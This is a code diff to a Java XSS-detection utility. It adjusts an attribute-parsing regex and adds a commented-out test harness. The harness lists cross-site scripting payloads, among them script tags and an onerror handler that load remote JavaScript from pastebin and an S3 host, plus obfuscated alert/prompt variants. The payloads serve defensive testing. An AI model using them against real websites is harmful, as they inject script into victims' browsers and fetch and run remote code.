@@ -96,7 +96,7 @@ public class CallbackUtils {
         htmlStartTagExtractor = Pattern.compile(
                 "<([!?a-zA-Z]+[0-9]*)(?:\\s*|\\\\)?([\\s\\S]*?)?>([\\s\\S]*?)",
                 Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
-        htmlArgExtractor = Pattern.compile("([\\s\\/]+[a-zA-z\\-\\_0-9]+[\\s\\/]*)=(('|\")([\\s\\S]*?)\\3|\\S+)",
+        htmlArgExtractor = Pattern.compile("([\\s\\/]*[a-zA-z\\-\\_0-9]+[\\s\\/]*)=((?:\\s*?)('|\")([\\s\\S]*?)\\3|\\S+)",
                 Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
         sqlConnectionMap = new LinkedHashMap<Integer, JADatabaseMetaData>(50) {
             @Override
@@ -195,7 +195,6 @@ public class CallbackUtils {
                     attribKey = StringUtils.removeStart(attribKey, BACKWARD_SLASH).trim();
 
                     String attribVal = attribMatcher.group(4);
-
                     if (StringUtils.isNotBlank(attribVal) && (StringUtils.startsWithIgnoreCase(attribKey, ON1)
                             || StringUtils.equalsIgnoreCase(attribKey, SRC)
                             || StringUtils.equalsIgnoreCase(attribKey, HREF)
@@ -207,6 +206,34 @@ public class CallbackUtils {
         }
         return attackConstructs;
     }
+
+
+//    public static void main(String[] args) {
+//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
+//        System.out.println("Detection : " + isXSS("<img src=\"///\" onerror=\"a = document.createElement('script'); a.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js'; document.head.appendChild(a);\" />"));
+//        System.out.println("Detection : " + isXSS("<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\""));
+//        System.out.println("Detection : " + isXSS("<script /**/>/**/alert(1)/**/</script /**/"));
+//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
+//
+//        System.out.println("Detection : " + isXSS("<script src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" >"));
+//
+//        System.out.println("Detection : " + isXSS("<<script  src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" > </script"));
+//
+//        System.out.println("Detection : " + isXSS("<img src=\"/\" =_=\" title=\"\nonerror='prompt(1)'\">"));
+//
+//        System.out.println("Detection : " + isXSS("<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">"));
+//
+//        System.out.println("Detection : " + isXSS("<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"));
+//
+//        System.out.println("Detection : " + isXSS("<<SCRIPT>ale\nrt(\"XSS\");//<</SCRIPT>>>>"));
+//
+//        System.out.println("Detection : " + isXSS("<script\n" +
+//                ">alert(1); \n" +
+//                "</script\n" +
+//                ">"));
+
+
+//    }
 
     /**
      * @return the sqlConnectionMap
